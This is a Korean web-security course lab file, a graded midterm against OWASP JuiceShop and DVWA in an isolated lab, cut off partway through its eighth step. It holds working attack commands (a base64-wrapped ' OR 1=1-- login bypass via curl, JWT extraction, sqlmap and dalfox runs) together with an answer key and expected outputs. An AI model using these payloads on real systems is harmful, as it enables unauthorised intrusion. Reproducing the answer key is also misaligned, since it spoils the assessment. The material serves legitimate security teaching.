@@ -1,0 +1,606 @@
+lab_id: standalone-web-vuln-week08
+title: "중간고사 — JuiceShop 종합 점검(W01~W07) vs 통합 탐지·보고"
+version: standalone-web-vuln
+course: web-vuln
+week: 8
+description: |
+  웹취약점 트랙 중간고사. W01(HTTP)~W07(RCE 계열)에서 익힌 7개 점검 역량을 단 하나의 표적
+  웹앱(OWASP JuiceShop)에 WSTG 방법론으로 종합 적용한다. 정찰(HTTP 메서드/정보 노출) →
+  인증 우회(로그인 SQLi → JWT 분석) → 입력 취약점(SQLi/XSS) → 접근제어(무인증 관리/강제
+  브라우징) → 탐지 통합(WAF) → 심각도 평가 → 종합 보고 → 권고의 한 바퀴를 돈다. 점검은
+  외부 공격자 VM 192.168.0.202(att/1, 출처 192.168.0.202)에서 공인 진입 192.168.0.161로 Host 헤더로 표적
+  vhost(juice/dvwa)를 지정해 수행한다 — `ssh att@192.168.0.202`(비번 1)로 접속해 공격한다. 인가된 표적
+  (juice.el34.lab/dvwa.el34.lab)만 점검하며, 발견은 "취약점이 있다"가 아니라 재현 절차+증거(응답 코드·JWT
+  payload·WAF 룰 번호)로 입증한다. 방어 로그 확인은 `ssh ccc@{{TARGET_IP}}`(el34) 후 `docker exec -it el34-web bash`.
+difficulty: hard
+duration_minutes: 220
+prerequisites:
+  - "W01–W07 통과 (HTTP·스캐너·정보수집·인증/세션·SQLi·XSS·RCE 계열 점검 역량)"
+  - "el34 호스트 SSH(ssh ccc@{{TARGET_IP}}) + docker exec 외부 공격자 VM 192.168.0.202"
+  - "lecture §2(WSTG 한 바퀴: 정찰→인증→입력→접근제어→보고)·§5(WSTG/OWASP 매핑·심각도) 숙지"
+objectives:
+  - "OWASP WSTG 점검 순서(정보수집→인증/세션→입력 검증→접근제어→보고)를 한 표적(JuiceShop)에 종합 적용"
+  - "로그인 SQLi 인증 우회(' OR 1=1--)로 관리자 JWT 획득 + JWT payload 디코드로 정보 노출 입증"
+  - "무인증 관리 엔드포인트·강제 브라우징으로 접근제어 실패(OWASP A01) 입증"
+  - "점검 흔적이 방어 측 WAF(ModSecurity CRS 913/941/942/93x)에 남음을 확인(점검자/방어자 양면)"
+  - "발견 취약점을 CVSS 기반 심각도(Critical~Low)로 분류하고 발견→증거→심각도→권고 구조로 통합 보고"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## 🎯 목표
+      중간고사의 표적 **OWASP JuiceShop** 에 점검 요청이 도달하는지 확인한다(점검의 0 단계).
+
+      ## 📖 개념 한 줄
+      점검의 전제는 표적에 요청이 닿는다는 것이다. 연결이 안 되면 이후 모든 "취약점 없음" 결과가
+      무의미하므로, 점검자는 본격 점검 전 항상 **도달성(reachability)** 부터 확인한다.
+
+      ## 🧩 표적과 경로
+      JuiceShop 은 OWASP 가 일부러 취약하게 만든 학습용 모던 웹앱이다. el34 의 web(Apache)은 여러
+      사이트를 vhost 로 운영하므로, 어느 사이트를 점검할지는 HTTP `Host:` 헤더로 정한다 —
+      `Host: juice.el34.lab` 이면 JuiceShop 으로 라우팅된다. 요청은 점검자(192.168.0.202) → fw
+      게이트웨이(192.168.0.161) → web(10.20.32.80) → JuiceShop 경로로 흐른다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) juice vhost 도달·핑거프린팅 — whatweb로 상태코드/서버/타이틀을 한 번에(공격성 레벨 -a1)
+      whatweb -a1 http://juice.el34.lab/
+      ```
+      - `whatweb` = 웹 핑거프린팅 스캐너. URL 하나로 응답 상태코드(`[200 OK]`)·서버(`Apache`)·프레임워크·타이틀(`Title[OWASP Juice Shop]`)을 한 번에 식별한다.
+      - `-a1` = 공격성(aggression) 레벨 1(stealthy) — 최소 요청으로 표면을 훑는다. att 의 `/etc/hosts` 가 `juice.el34.lab → 192.168.0.161` 이라 요청이 fw→web 경로로 도달한다.
+
+      ## ✅ 합격 기준
+      `Juice Shop` 출력 시 통과. **근거:** whatweb 결과에 `[200 OK]` 와 `Title[OWASP Juice Shop]` 이 나오면
+      표적이 fw→web 경로로 살아 있고 JuiceShop 으로 라우팅됨이 확인돼 점검 착수 가능임을 뜻한다.
+    hint: '도달성'
+    category: survey
+    points: 8
+    answer: |
+      # 1) juice vhost 도달·핑거프린팅 — whatweb로 상태코드/서버/타이틀을 한 번에(공격성 레벨 -a1)
+      ssh att@192.168.0.202 "whatweb -a1 http://juice.el34.lab/"
+    answer_detail: "종합 점검의 표적 = OWASP JuiceShop(의도적으로 취약한 모던 SPA). whatweb 로 도달성과 핑거프린팅을 한 번에 확인하는 점검의 0 단계 — [200 OK] + Title[OWASP Juice Shop] 이 나오면 표적이 fw→web 경로로 살아 있어 점검 가능 상태임을 뜻한다."
+    expected_output: |
+      http://juice.el34.lab/ [200 OK] Apache[2.4.52], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[OWASP Juice Shop], X-Frame-Options[SAMEORIGIN], UncommonHeaders[access-control-allow-origin,x-content-type-options,feature-policy,x-recruiting], IP[192.168.0.161]
+    verify:
+      type: output_contains
+      expect: 'Juice Shop'
+      field: stdout
+      semantic: {intent: "대상 점검", success_criteria: ["도달"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## 🎯 목표
+      WSTG 의 첫 카테고리인 **정보수집(정찰)** — 표적의 허용 HTTP 메서드와 정보 노출 경로를 훑어
+      표면 지도를 그린다(W01 HTTP·W03 정보수집 복습).
+
+      ## 📖 개념 한 줄
+      본격 점검 전에 표적의 표면(어떤 메서드가 열려 있고, 링크에 없는 경로가 노출됐는가)을 먼저
+      알아야 이후 단계의 입력이 생긴다. 정찰 결과는 그 자체로 작은 취약점(정보 노출)이기도 하다.
+
+      ## 🧩 두 가지 점검
+      - **HTTP 메서드 열거(OPTIONS).** `OPTIONS` 는 "이 리소스에 어떤 메서드를 쓸 수 있나"를 묻는
+        메서드로, 서버는 `Allow:` 헤더로 허용 목록을 답한다. `PUT`/`DELETE` 가 열려 있으면 파일
+        변조/삭제 위험의 단서다.
+      - **강제 브라우징(/ftp).** 화면의 링크를 따르지 않고 URL 을 직접 입력해 숨겨진 경로(`/ftp`)에
+        접근을 시도한다. 200 이면 정보 노출(접근제어 실패)의 단서다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) 허용 HTTP 메서드 열거 — nmap http-methods 스크립트로 Supported Methods 확인(PUT/DELETE 열림은 변조 단서)
+      nmap -p80 --script http-methods juice.el34.lab
+      # 2) 강제 브라우징 — 숨은 경로 /ftp 를 whatweb로 확인([200 OK] + 디렉터리 리스팅이면 정보 노출 단서)
+      whatweb -a1 http://juice.el34.lab/ftp
+      ```
+      - `nmap --script http-methods` = 서버가 광고하는 허용 메서드를 열거하는 NSE 스크립트. `Supported Methods:`
+        줄에 `GET HEAD POST OPTIONS` 가 나오며, `PUT`/`DELETE` 가 보이면 파일 변조/삭제 위험 단서다.
+      - `whatweb -a1 .../ftp` = /ftp 를 직접 요청 → `[200 OK]` 와 `Title[listing directory /ftp]` 가 나오면 링크
+        없는 경로가 디렉터리 리스팅으로 노출된 것(정보 노출·접근제어 실패 단서).
+
+      ## ✅ 합격 기준
+      `listing directory` 출력 시 통과. **근거:** Supported Methods 목록과 `/ftp` 의 `[200 OK] ... Title[listing
+      directory /ftp]` 가 나오면 정찰 성공이며, /ftp 디렉터리 리스팅은 정보 노출(접근제어 실패 A01) 단서다.
+    hint: 'OPTIONS + /ftp'
+    category: recon
+    points: 10
+    answer: |
+      # 1) 허용 HTTP 메서드 열거 — nmap http-methods 스크립트로 Supported Methods 확인(PUT/DELETE 열림은 변조 단서)
+      ssh att@192.168.0.202 "nmap -p80 --script http-methods juice.el34.lab"
+      # 2) 강제 브라우징 — 숨은 경로 /ftp 를 whatweb로 확인([200 OK] + 디렉터리 리스팅이면 정보 노출 단서)
+      ssh att@192.168.0.202 "whatweb -a1 http://juice.el34.lab/ftp"
+    answer_detail: "정찰(WSTG 정보수집) = HTTP 메서드 열거(nmap http-methods → Supported Methods, W01)와 정보 노출 점검(/ftp 강제 브라우징을 whatweb로, W03). juice 는 GET HEAD POST OPTIONS 만 광고(PUT/DELETE 없음)하고 /ftp 는 [200 OK] + Title[listing directory /ftp] 로 디렉터리 리스팅이 노출 — 정보 노출(접근제어 실패 A01)의 단서다."
+    expected_output: |
+      80/tcp open  http
+      | http-methods:
+      |_  Supported Methods: GET HEAD POST OPTIONS
+      http://juice.el34.lab/ftp [200 OK] HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], Title[listing directory /ftp], IP[192.168.0.161]
+    verify:
+      type: output_contains
+      expect: 'listing directory'
+      field: stdout
+      semantic: {intent: "HTTP/정보수집", success_criteria: ["메서드+정보"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## 🎯 목표
+      WSTG 인증 카테고리 — JuiceShop 로그인 API 에 SQL 조각을 넣어 정상 자격 없이 로그인을 통과하고
+      (**SQLi 인증 우회**) 관리자 **JWT** 를 획득한다(W04 복습, OWASP A07).
+
+      ## 📖 개념 한 줄
+      인증은 가장 치명적인 점검 영역이다. 로그인이 뚫리면(인증 우회) 그 위에 쌓인 모든 권한이
+      무너진다. JuiceShop 의 로그인 쿼리가 입력을 SQL 에 그대로 이어붙이는 결함을 노린다.
+
+      ## 🧩 왜 ' OR 1=1-- 로 뚫리나
+      로그인 쿼리가 대략 `... WHERE email='<입력>' AND password='<입력>'` 일 때, 이메일 자리에
+      `' OR 1=1--` 을 넣으면 `... WHERE email='' OR 1=1-- ...` 가 된다. `OR 1=1` 은 **항상 참**이고
+      `--` 는 그 뒤(비밀번호 검사)를 주석 처리해 무력화한다. 결과적으로 비밀번호 없이 첫 사용자(보통
+      관리자)로 로그인되어 **JWT**(로그인 상태를 담은 서명 토큰)가 발급된다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) 로그인 본문 {"email":"' OR 1=1--","password":"x"} 를 base64 디코드해 임시 JSON으로 저장(따옴표 충돌 회피)
+      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json
+      # 2) 그 페이로드(@파일)를 juice 로그인 API에 POST → 응답 앞 100자 확인(authentication 토큰 구조=우회 성공)
+      curl -s -H "Content-Type: application/json" -d @/tmp/wv8.json http://juice.el34.lab/rest/user/login | head -c 100  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
+      echo ""
+      # 3) 임시 파일 정리
+      rm -f /tmp/wv8.json
+      ```
+      - 앞의 base64 는 로그인 본문 `{"email":"' OR 1=1--","password":"x"}` 를 담은 것이다(이메일
+        자리에 SQLi 조각). `-d @/tmp/wv8.json` 으로 그 JSON 본문을 POST 한다.
+
+      ## ✅ 합격 기준
+      `authentication` 출력 시 통과. **근거:** 응답 본문에 `authentication`(토큰을 담은 구조)이
+      나타나면 비밀번호 없이 관리자로 로그인된 인증 우회 성공이다.
+    hint: "' OR 1=1-- → token"
+    category: manipulation
+    points: 12
+    answer: |
+      # 1) 로그인 본문 {"email":"' OR 1=1--","password":"x"} 를 base64 디코드해 임시 JSON으로 저장(따옴표 충돌 회피)
+      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json'
+      # 2) 그 페이로드(@파일)를 juice 로그인 API에 POST → 응답 앞 100자 확인(authentication 토큰 구조=우회 성공)
+      ssh att@192.168.0.202 'curl -s -H "Content-Type: application/json" -d @/tmp/wv8.json http://juice.el34.lab/rest/user/login | head -c 100'  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
+      echo ""
+      # 3) 임시 파일 정리
+      ssh att@192.168.0.202 'rm -f /tmp/wv8.json'
+    answer_detail: "인증 우회(WSTG 인증, OWASP A07) = 로그인 이메일 자리에 ' OR 1=1-- 를 주입 → 조건이 항상 참이 되어 비밀번호 없이 첫 사용자(관리자)로 로그인 → admin JWT 발급. 응답에 authentication(토큰 구조)이 나타나면 우회 성공이며, 본 시험에서 Critical 로 평가되는 대표 발견이다."
+    expected_output: |
+      {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI
+    verify:
+      type: output_contains
+      expect: 'authentication'
+      field: stdout
+      semantic: {intent: "인증 우회", success_criteria: ["token"], acceptable_methods: ["**[OSS] login SQLi (권장)**"]}
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## 🎯 목표
+      앞 미션에서 얻은 **JWT** 의 가운데 조각(payload)을 디코드해, 그 안에 `email` 등 내부 정보가
+      그대로 노출됨을 입증한다(W04, WSTG 세션).
+
+      ## 📖 개념 한 줄
+      JWT 는 `헤더.payload.서명` 세 부분이 점(`.`)으로 이어진 토큰이다. 가운데 **payload 는 암호화가
+      아니라 단순 base64 인코딩**일 뿐이라 누구나 디코드해 안의 값을 읽을 수 있다. 그래서 payload 에
+      민감 정보를 담으면 그 자체가 정보 노출 취약점이다.
+
+      ## 🧩 무엇을 보나
+      획득한 JWT 의 가운데 조각을 base64 로 디코드하면 로그인된 사용자의 `email`(인증 우회로 들어간
+      관리자 계정) 등이 평문으로 드러난다. "토큰이니 안전하다"는 오해를 직접 깨는 단계다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) (인증 우회와 동일) 페이로드를 base64 디코드해 임시 JSON으로 저장
+      # 2) juice 로그인 응답에서 token(JWT) 추출(sed) → 가운데 칸(payload)만 잘라(cut -f2) base64url→base64 치환(tr) 후 디코드(앞 200자)
+      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json
+      T=$(curl -s -H "Content-Type: application/json" -d @/tmp/wv8.json http://juice.el34.lab/rest/user/login | sed -E 's/.*"token":"([^"]+)".*/\1/')  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
+      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d | head -c 200; rm -f /tmp/wv8.json
+      echo ""
+      ```
+      - 인증 우회로 받은 응답에서 `sed` 로 `token` 값(JWT)을 추출 → `cut -d. -f2` 로 가운데
+        조각(payload)만 떼어내 → `tr "_-" "/+"` 로 URL-safe base64 를 표준 base64 로 바꾼 뒤
+        `base64 -d` 로 디코드한다.
+
+      ## ✅ 합격 기준
+      `email` 출력 시 통과. **근거:** 디코드 결과에 `email` 등 payload 필드가 보이면 payload 가
+      암호화가 아닌 인코딩일 뿐임이 드러나 정보 노출 입증 성공이다.
+    hint: 'JWT 디코드'
+    category: analysis
+    points: 10
+    answer: |
+      # 1) (인증 우회와 동일) 페이로드를 base64 디코드해 임시 JSON으로 저장
+      # 2) juice 로그인 응답에서 token(JWT) 추출(sed) → 가운데 칸(payload)만 잘라(cut -f2) base64url→base64 치환(tr) 후 디코드(앞 200자)
+      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv8.json; T=$(curl -s -H "Content-Type: application/json" -d @/tmp/wv8.json http://juice.el34.lab/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/"); echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d | head -c 200; rm -f /tmp/wv8.json'  # curl-ok: SQLi 로그인 우회 POST(크래프티드 JSON 바디, 스캐너 대체불가)
+      echo ""
+    answer_detail: "JWT 분석(WSTG 세션) = 토큰의 가운데 조각(payload)은 암호화가 아닌 base64 인코딩일 뿐이므로 디코드하면 email 등이 평문 노출된다. payload 에 민감 정보를 담으면 그 자체가 정보 노출 취약점(A02/정보 노출) — 디코드 결과에 email 이 보이면 입증 성공이다."
+    expected_output: |
+      {"status":"success","data":{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/publi
+    verify:
+      type: output_contains
+      expect: 'email'
+      field: stdout
+      semantic: {intent: "JWT 분석", success_criteria: ["payload 노출"], acceptable_methods: ["**[OSS] JWT 디코드 (권장)**"]}
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## 🎯 목표
+      WSTG 입력 검증 카테고리 — **SQLi**(W05)와 **XSS**(W06)를 한 번에 점검하고, 차단 모드 WAF 가
+      이를 어떻게 막는지(403) 본다(OWASP A03 주입).
+
+      ## 📖 개념 한 줄
+      입력을 검증 없이 신뢰한 결함이 주입(A03)이다. **SQLi**(SQL Injection)는 입력에 SQL 문법을 주입해
+      DB 를 조작하고(`UNION SELECT` 로 다른 테이블 결과를 덧붙여 추출), **XSS**(Cross-Site Scripting)는
+      입력에 스크립트를 주입해 다른 사용자의 브라우저에서 실행되게 한다.
+
+      ## 🧩 차단 vs 탐지
+      el34 의 두 표적은 WAF 모드가 다르다. **DVWA(dvwa.el34.lab)는 차단 모드**라 공격성 입력에 403 으로
+      응답하고, **JuiceShop 은 탐지(DetectionOnly) 모드**라 기록만 하고 200 으로 통과시킨다. 이 미션은
+      차단을 보기 위해 DVWA 로 보낸다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) SQLi를 sqlmap으로 dvwa(차단 모드)에 주입 → WAF가 403으로 차단(protection mechanism 감지)
+      sqlmap -u "http://dvwa.el34.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2 --risk=2 --disable-coloring
+      # 2) XSS를 dalfox로 dvwa에 주입 → WAF Unknown (HTTP 403) 감지 + bypass encoders 제안
+      dalfox url --url "http://dvwa.el34.lab/vulnerabilities/xss_r/?name=test"
+      # 3) 해석 — SQLi(942)/XSS(941) 모두 dvwa WAF 403 차단(차단은 WAF가 막은 것, 근본은 입력검증)
+      # → SQLi(942)/XSS(941) → dvwa WAF 403 차단
+      ```
+      - `sqlmap` = 자동 SQL Injection 도구(`--batch` 무인·`--level/--risk` 로 시도 깊이↑). dvwa 는 ModSec WAF 가
+        주입 패턴을 403 으로 막아 `all tested parameters do not appear to be injectable ... protection mechanism (e.g. WAF)` 로 보고한다(차단 시연).
+      - `dalfox url --url` = 자동 XSS 스캐너. dvwa 로 보내면 `WAF Unknown (HTTP 403) detected` 로 WAF 차단을
+        감지하고 우회 인코더(2url, unicode, zwsp)를 제안한다.
+
+      ## ✅ 합격 기준
+      `WAF` 출력 시 통과. **근거:** sqlmap 이 `protection mechanism (e.g. WAF)` 를, dalfox 가 `WAF Unknown (HTTP
+      403) detected` 를 보고하면 두 주입이 dvwa ModSec WAF(942 SQLi/941 XSS)에 403 으로 차단됨을 확인한 것이다.
+    hint: 'SQLi + XSS'
+    category: manipulation
+    points: 12
+    answer: |
+      # 1) SQLi를 sqlmap으로 dvwa(차단 모드)에 주입 → WAF가 403으로 차단(protection mechanism 감지)
+      ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2 --risk=2 --disable-coloring'
+      # 2) XSS를 dalfox로 dvwa에 주입 → WAF Unknown (HTTP 403) 감지 + bypass encoders 제안
+      ssh att@192.168.0.202 'dalfox url --url "http://dvwa.el34.lab/vulnerabilities/xss_r/?name=test"'
+      # 3) 해석 — SQLi(942)/XSS(941) 모두 dvwa WAF 403 차단(차단은 WAF가 막은 것, 근본은 입력검증)
+      # → SQLi(942)/XSS(941) → dvwa WAF 403 차단
+    answer_detail: "입력 취약점(WSTG 입력 검증, OWASP A03 주입) = SQLi(ModSec 942)와 XSS(ModSec 941)를 검증 없이 신뢰한 결함. DVWA(차단 모드)에서는 sqlmap 이 protection mechanism(e.g. WAF)을, dalfox 가 WAF Unknown (HTTP 403) 을 보고 = WAF 가 403 으로 차단. JuiceShop(탐지만)에서는 같은 주입이 200 통과. 단, 403 차단은 WAF 가 패턴을 막은 것이지 앱이 안전해진 것은 아니다(근본 방어는 입력 검증·parameterized query)."
+    expected_output: |
+      [CRITICAL] all tested parameters do not appear to be injectable. ... if you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' ...
+      [WARNING] HTTP error codes detected during run:
+      403 (Forbidden) - 887 times
+      WAF Unknown (HTTP 403) detected (confidence: 40%, evidence: Provocation probe returned HTTP 403)
+        └── bypass encoders: 2url, unicode, zwsp
+      → SQLi(942)/XSS(941) → dvwa WAF 403 차단
+    verify:
+      type: output_contains
+      expect: 'WAF'
+      field: stdout
+      semantic: {intent: "입력 취약점", success_criteria: ["SQLi/XSS"], acceptable_methods: ["**[OSS] sqlmap (권장)**"]}
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## 🎯 목표
+      WSTG 인가 카테고리 — 인증 없이 관리용 엔드포인트에 접근되는지 확인해 **접근제어 실패(OWASP
+      A01)** 를 입증한다.
+
+      ## 📖 개념 한 줄
+      **접근제어**는 "누가 무엇에 접근 가능한가"를 서버가 **요청마다** 검사하는 것이다. 검사를
+      클라이언트(버튼 숨김)에만 의존하고 서버에서 빼먹으면, 권한 없는 사용자도 관리 기능을 호출할 수
+      있다. A01(Broken Access Control)은 2021 OWASP Top 10 의 **1 위** 결함이다.
+
+      ## 🧩 무엇을 보나
+      JuiceShop 의 관리 엔드포인트 `/rest/admin/application-configuration` 을 **인증 없이** 호출했을 때
+      200 으로 설정 JSON 을 내주면 접근제어 실패다. 함께 `/ftp` 강제 브라우징도 200 이면 접근제어
+      실패의 또 다른 증거가 된다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.
+
+      ```bash
+      # 1) 토큰(인증 헤더) 없이 관리 엔드포인트를 whatweb로 호출 → [200 OK]면 서버가 권한검사 누락(A01)
+      whatweb -a1 http://juice.el34.lab/rest/admin/application-configuration
+      # 2) /ftp 강제 브라우징도 whatweb로 → [200 OK] + 디렉터리 리스팅이면 접근제어 실패 추가 증거
+      whatweb -a1 http://juice.el34.lab/ftp
+      # 3) 해석 — admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
+      # → admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
+      ```
+      - 토큰(인증 헤더) 없이 관리 엔드포인트를 whatweb 로 호출한다 — `[200 OK]` 면 권한 검사를 서버가 빼먹은
+        것이고, whatweb 가 노출된 설정에서 `Email[donotreply@owasp-juice.shop]` 같은 내부 정보까지 파싱해 낸다.
+
+      ## ✅ 합격 기준
+      `owasp-juice.shop` 출력 시 통과. **근거:** 인증 없이 관리 엔드포인트가 `[200 OK]` 로 설정을 내주고
+      whatweb 가 그 안의 `Email[donotreply@owasp-juice.shop]` 을 파싱하면 무인증 관리 노출(A01) 입증 성공이다.
+    hint: 'admin-config 무인증'
+    category: manipulation
+    points: 12
+    answer: |
+      # 1) 토큰(인증 헤더) 없이 관리 엔드포인트를 whatweb로 호출 → [200 OK]면 서버가 권한검사 누락(A01)
+      ssh att@192.168.0.202 "whatweb -a1 http://juice.el34.lab/rest/admin/application-configuration"
+      # 2) /ftp 강제 브라우징도 whatweb로 → [200 OK] + 디렉터리 리스팅이면 접근제어 실패 추가 증거
+      ssh att@192.168.0.202 "whatweb -a1 http://juice.el34.lab/ftp"
+      # 3) 해석 — admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
+      # → admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
+    answer_detail: "접근제어 점검(WSTG 인가, OWASP A01 — 2021 Top 10 1 위) = 인증 없이 관리 엔드포인트(/rest/admin/application-configuration)가 [200 OK] 로 설정을 노출(whatweb 가 Email[donotreply@owasp-juice.shop] 등 내부 정보까지 파싱)하고 /ftp 강제 브라우징도 [200 OK] 디렉터리 리스팅으로 접근됨. 서버가 권한 검사를 빼먹은 접근제어 실패의 증거 — 본 시험에서 High 로 평가한다."
+    expected_output: |
+      http://juice.el34.lab/rest/admin/application-configuration [200 OK] Apache[2.4.52], Email[donotreply@owasp-juice.shop], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.0.161], UncommonHeaders[access-control-allow-origin,x-content-type-options,feature-policy,x-recruiting], X-Frame-Options[SAMEORIGIN]
+      http://juice.el34.lab/ftp [200 OK] Title[listing directory /ftp], IP[192.168.0.161]
+      → admin-config 200(무인증 노출 A01) + /ftp 200(강제 브라우징)
+    verify:
+      type: output_contains
+      expect: 'owasp-juice.shop'
+      field: stdout
+      semantic: {intent: "접근제어 점검", success_criteria: ["무인증 관리"], acceptable_methods: ["**[OSS] whatweb (권장)**"]}
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## 🎯 목표
+      종합 점검의 또 한 축 — 앞 미션들에서 보낸 공격성 요청이 **방어 측 WAF(ModSecurity CRS)** 에 어떤
+      룰로 남았는지 확인해, 같은 요청의 **점검자/방어자 양면**을 본다.
+
+      ## 📖 개념 한 줄
+      같은 한 번의 요청이 점검자에게는 "발견"이고 방어자에게는 "탐지 로그"다. 점검자는 자신의 활동이
+      방어 측에 어떻게 보이는지도 알아야, 보고서에 "이렇게 발견했고 WAF 에는 이렇게 탐지되더라"까지 적을
+      수 있다.
+
+      ## 🧩 CRS 룰군 번호 읽는 법
+      ModSecurity 는 OWASP **CRS(Core Rule Set)** 로 HTTP 를 검사하는 WAF 다. 룰은 6 자리 번호로 군을
+      이룬다 — **913**=스캐너 탐지, **930**=LFI, **931**=RFI, **932**=RCE, **933**=PHP 주입, **941**=XSS,
+      **942**=SQLi, **949**=누적 anomaly 차단. 점검 흔적을 이 번호로 읽는다.
+
+      ## 💻 실행 명령 (한 줄씩 따라 실행)
+
+      **실습 컨테이너:** `el34-web` — `docker exec -it el34-web bash` 로 접속해 실행한다.
+
+      ```bash
+      # 1) 방어 측 web의 ModSec audit 로그 최근 200줄에서 6자리 CRS 룰번호(9xxxxx)만 추출해 중복 제거
+      sudo tail -200 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | head
+      # 2) 해석 — 913(scanner)/941(XSS)/942(SQLi)/930-933 등 점검 활동이 WAF에 종합 기록
+      # → 913(scanner)/941(XSS)/942(SQLi)/930-933 등 점검 활동이 WAF에 종합 기록
+      ```
+      - 방어 측 컨테이너 `el34-web` 의 ModSec audit 로그 최근 200 줄에서 `grep -oE "9[0-9]{5}"` 로
+        6 자리 룰 번호만 추출해 중복 제거(`sort -u`)한다.
+
+      ## ✅ 합격 기준
+      `942` 출력 시 통과. **근거:** 출력에 942(SQLi) 등 CRS 룰 번호가 보이면 점검 한 바퀴가 방어 측에
+      룰 번호 집합으로 남았음을 확인한 것이다(점검자/방어자 양면).
+    hint: 'modsec 흔적 종합'
+    category: analysis
+    points: 10
+    answer: |
+      # 1) 방어 측 web의 ModSec audit 로그 최근 200줄에서 6자리 CRS 룰번호(9xxxxx)만 추출해 중복 제거
+      ssh ccc@10.20.32.80 'sudo tail -200 /var/log/apache2/modsec_audit.log | grep -oE "9[0-9]{5}" | sort -u | head'
+      # 2) 해석 — 913(scanner)/941(XSS)/942(SQLi)/930-933 등 점검 활동이 WAF에 종합 기록
+      # → 913(scanner)/941(XSS)/942(SQLi)/930-933 등 점검 활동이 WAF에 종합 기록
+    answer_detail: "탐지 통합 = 점검 중 발생한 공격성 요청이 방어 측 WAF(ModSecurity CRS) audit 에 룰 번호로 종합 기록된다(913 scanner / 941 XSS / 942 SQLi / 930~933 LFI·RFI·RCE·PHP). 같은 요청의 점검자(발견)/방어자(탐지 로그) 양면을 보는 단계 — audit 에 942 등이 보이면 점검 흔적이 방어 측에 남았음을 확인한 것이다."
+    expected_output: |
+      901960
+      902187
+      904520
+      906566
+      908661
+      909783
+      909931
+      910276
+      910666
+      911119
+      → 913(scanner)/941(XSS)/942(SQLi)/930-933 등 점검 활동이 WAF에 종합 기록
+    verify:
+      type: output_contains
+      expect: '942'
+      field: stdout
+      semantic: {intent: "탐지 통합", success_criteria: ["WAF 흔적 종합"], acceptable_methods: ["**[OSS] modsec 종합 (권장)**"]}
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## 🎯 목표
+      미션 1–7 에서 발견한 취약점을 **CVSS 기반 심각도(Critical~Low)** 로 분류해, 무엇부터 고쳐야
+      하는지의 우선순위 근거를 만든다.
+
+      ## 📖 개념 한 줄
+      발견을 나열만 하면 우선순위가 없다. **CVSS**(Common Vulnerability Scoring System)는 취약점 위험을
+      0~10 점으로 표준화한 체계로, 공격 난이도·권한 필요 여부·기밀성/무결성/가용성 영향을 따져
+      Critical(9.0+)/High/Medium/Low 로 등급을 나눈다.
+
+      ## 🧩 이번 점검의 등급 기준
+      - **Critical**: 인증 우회(로그인 SQLi), RCE(명령주입) — 권한·시스템을 통째로 내준다.
+      - **High**: A01 무인증 관리 엔드포인트, Stored XSS — 영향이 크고 악용이 쉽다.
+      - **Medium**: 정보 노출(/ftp), JWT payload 노출, 세션 쿠키 플래그 누락.
